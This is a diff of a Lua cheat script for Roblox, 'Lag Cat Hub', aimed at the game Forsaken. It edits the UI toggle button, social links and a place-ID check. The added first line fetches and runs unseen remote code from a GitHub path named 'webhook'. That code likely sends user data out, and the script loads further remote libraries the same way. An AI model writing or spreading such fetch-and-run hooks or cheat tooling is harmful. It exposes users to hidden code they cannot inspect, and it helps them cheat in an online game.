@@ -1,4 +1,12 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/lol/refs/heads/main/webhook"))()
 
+local allowed = {
+    [18687417158] = true,
+}
+
+if not allowed[game.PlaceId] then
+    return
+end
 local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/npmc_/refs/heads/main/FluentEdited.lua"))()
 local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
@@ -8,7 +16,7 @@ local Window = Fluent:CreateWindow({
     Title = "Lag Cat Hub",
     SubTitle = "by yeugaivotu",
     Search = true,
-    Icon = "rbxassetid://87713799117477",
+    Icon = "rbxassetid://100794969021111",
     TabWidth = 160,
     Size = UDim2.fromOffset(480, 360),
     Acrylic = true,
@@ -349,132 +357,113 @@ end
 _G.ESPManager = ESPManager
 
 
--- Phần Tạo Nút Gui
-
--- 🟢 DRAGGABLE UI BUTTON WITH ENHANCED CLICK AND HOVER ANIMATIONS
-local UserInputService = game:GetService("UserInputService")
-local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 
--- Xóa nếu có UI minimize cũ
-local ExistingUI = CoreGui:FindFirstChild("HutaoHubMinimizeUI")
-if ExistingUI then
-    ExistingUI:Destroy()
-end
+local HideGui = Instance.new("ScreenGui")
+HideGui.Name = "Crystal Hub Btn"
+HideGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+HideGui.ResetOnSpawn = false
+HideGui.Parent = game.CoreGui
 
--- Create Floating UI
-local DragUI = Instance.new("ScreenGui")
-DragUI.Name = "HutaoHubMinimizeUI"
-DragUI.ResetOnSpawn = false
-DragUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-DragUI.Parent = CoreGui
+local Zoomed = false
 
--- Create Circular Button
-local Button = Instance.new("ImageButton")
-Button.Parent = DragUI
-Button.Size = UDim2.new(0, 50, 0, 50)
-Button.Position = UDim2.new(0, 10, 1, -85)
-Button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-Button.BackgroundTransparency = 0.3
-Button.BorderSizePixel = 0
-Button.ClipsDescendants = true
-Button.Image = "rbxassetid://87713799117477" -- Thay icon nếu muốn
-Button.ScaleType = Enum.ScaleType.Fit
-Button.Active = true
-Button.ZIndex = 1000
+local SmallSize = 30
+local BigSize = 40
 
--- Make UI Circular
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(1, 0)
-UICorner.Parent = Button
+local btnHide = Instance.new("TextButton", HideGui)
+btnHide.BackgroundTransparency = 1
+btnHide.Text = ""
+btnHide.AnchorPoint = Vector2.new(0, 1)
+btnHide.Size = UDim2.new(0, 50, 0, 50)
+btnHide.Position = UDim2.new(0, 15, 1, -15)
 
--- Tween Info for Animations
-local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+local btnHideFrame = Instance.new("Frame", btnHide)
+btnHideFrame.AnchorPoint = Vector2.new(0, 1)
+btnHideFrame.Size = UDim2.new(0, 50, 0, 50)
+btnHideFrame.Position = UDim2.new(0, 0, 1, 0)
+btnHideFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+btnHideFrame.BackgroundTransparency = .25
 
--- 🟢 Toggle Fluent UI trực tiếp
-local function ToggleUI()
-    if Window.Minimized then
-        Window:Minimize(false) -- mở lại
-    else
-        Window:Minimize(true) -- thu nhỏ
-    end
-end
+local imgHide = Instance.new("ImageLabel", btnHide)
+imgHide.BackgroundTransparency = 1
+imgHide.Image = "rbxassetid://100794969021111"
+imgHide.AnchorPoint = Vector2.new(.5, .5)
+imgHide.Position = UDim2.new(.5, 0, .5, 0)
+imgHide.Size = UDim2.new(0, SmallSize, 0, SmallSize)
 
--- Click Animation & UI Toggle
-local isDragging = false
-local dragThreshold = 10
+Instance.new("UICorner", btnHideFrame).CornerRadius = UDim.new(1, 0)
 
-Button.MouseButton1Click:Connect(function()
-    if isDragging then return end
+local function ToggleZoomState()
+    Zoomed = not Zoomed
+    local targetSize = Zoomed and BigSize or SmallSize
 
-    -- Click animation
-    TweenService:Create(Button, tweenInfo, {
-        BackgroundTransparency = 0.5,
-        Size = UDim2.new(0, 45, 0, 45),
-        Rotation = 5
+    TweenService:Create(imgHide, TweenInfo.new(.2, Enum.EasingStyle.Quad), {
+        Size = UDim2.new(0, targetSize, 0, targetSize)
     }):Play()
-    task.wait(0.1)
-    TweenService:Create(Button, tweenInfo, {
-        BackgroundTransparency = 0.3,
-        Size = UDim2.new(0, 50, 0, 50),
-        Rotation = 0
-    }):Play()
-
-    ToggleUI()
-end)
-
--- Hover Animation
-Button.MouseEnter:Connect(function()
-    TweenService:Create(Button, tweenInfo, {Size = UDim2.new(0, 55, 0, 55)}):Play()
-end)
-
-Button.MouseLeave:Connect(function()
-    TweenService:Create(Button, tweenInfo, {Size = UDim2.new(0, 50, 0, 50)}):Play()
-end)
-
--- Dragging Logic for PC & Mobile
-local dragging, dragStart, startPos
-
-local function StartDrag(input)
-    isDragging = false
-    dragging = true
-    dragStart = input.Position
-    startPos = Button.Position
-
-    input.Changed:Connect(function()
-        if input.UserInputState == Enum.UserInputState.End then
-            dragging = false
-        end
-    end)
 end
 
-local function OnDrag(input)
-    if dragging then
-        local delta = (input.Position - dragStart).Magnitude
-        if delta > dragThreshold then
-            isDragging = true
-        end
-        Button.Position = UDim2.new(
-            startPos.X.Scale,
-            startPos.X.Offset + (input.Position.X - dragStart.X),
-            startPos.Y.Scale,
-            startPos.Y.Offset + (input.Position.Y - dragStart.Y)
-        )
+btnHide.MouseButton1Click:Connect(function()
+    ToggleZoomState()
+
+    if Window and Window.Minimize then
+        Window:Minimize(not Window.Minimized)
     end
+
+    if Library and Library.ToggleUI then
+        Library.ToggleUI()
+    end
+end)
+
+local dragging = false
+local dragInput
+local dragStart
+local startPos
+local holdTime = 0.1
+local holdStarted = 0
+
+local function update(input)
+    local delta = input.Position - dragStart
+    btnHide.Position = UDim2.new(
+        startPos.X.Scale,
+        startPos.X.Offset + delta.X,
+        startPos.Y.Scale,
+        startPos.Y.Offset + delta.Y
+    )
 end
 
--- Dragging Support
-Button.InputBegan:Connect(function(input)
+btnHide.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        StartDrag(input)
+        holdStarted = tick()
+        dragStart = input.Position
+        startPos = btnHide.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                holdStarted = 0
+            end
+        end)
     end
 end)
 
-Button.InputChanged:Connect(function(input)
+btnHide.InputChanged:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        OnDrag(input)
+        dragInput = input
     end
-end)  
+end)
+
+RunService.RenderStepped:Connect(function()
+    if holdStarted > 0 and tick() - holdStarted >= holdTime and not dragging then
+        dragging = true
+    end
+
+    if dragging and dragInput then
+        update(dragInput)
+    end
+end)
+
 
 
 -- Tab.Dev
@@ -493,7 +482,7 @@ local Options = Fluent.Options
         Title = "Discord",
         Description = "Copy the link to join the discord!",
         Callback = function()
-            setclipboard("https://discord.gg/WEGT92yv")
+            setclipboard("https://discord.gg/KTG45Zv58j")
             Fluent:Notify({
                 Title = "Notification",
                 Content = "Successfully copied to the clipboard",
@@ -503,36 +492,6 @@ local Options = Fluent.Options
         end
     })
 
-
-
-    Tabs.Dev:AddButton({
-        Title = "Youtube",
-        Description = "Copy link to Subscribe to Youtube channel!",
-        Callback = function()
-            setclipboard("https://www.youtube.com/@SLKgamingSSR")
-            Fluent:Notify({
-                Title = "Notification",
-                Content = "Successfully copied to the clipboard!",
-                SubContent = "", -- Optional
-                Duration = 3 
-            })
-        end
-    })
-
-
-    Tabs.Dev:AddButton({
-        Title = "Facebook",
-        Description = "Copy link to join facebook group!",
-        Callback = function()
-            setclipboard("https://www.facebook.com/groups/1180845463307087/?ref=share&mibextid=NSMWBT")
-            Fluent:Notify({
-                Title = "Notification",
-                Content = "Successfully copied to the clipboard!",
-                SubContent = "", -- Optional
-                Duration = 3 
-            })
-        end
-    })
 
 -- Tabs.Farm
 
@@ -8699,26 +8658,18 @@ end)
 SaveManager:SetLibrary(Fluent)
 InterfaceManager:SetLibrary(Fluent)
 
--- Ignore keys that are used by ThemeManager.
--- (we dont want configs to save themes, do we?)
 SaveManager:IgnoreThemeSettings()
 
--- You can add indexes of elements the save manager should ignore
+
 SaveManager:SetIgnoreIndexes({})
 
--- use case for doing it this way:
--- a script hub could have themes in a global folder
--- and game configs in a separate folder per game
 InterfaceManager:SetFolder("LagCat HUB")
 SaveManager:SetFolder("LagCat HUB/Forsaken")
 
 InterfaceManager:BuildInterfaceSection(Tabs.Settings)
 SaveManager:BuildConfigSection(Tabs.Settings)
 
--- Select First Tab By Default
 Window:SelectTab(1)
 
 Fluent:Notify({ Title = "LagCat HUB", Content = "forsaken script loaded successfully!", Duration = 5 })
 SaveManager:LoadAutoloadConfig()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/lol/refs/heads/main/webhook"))()
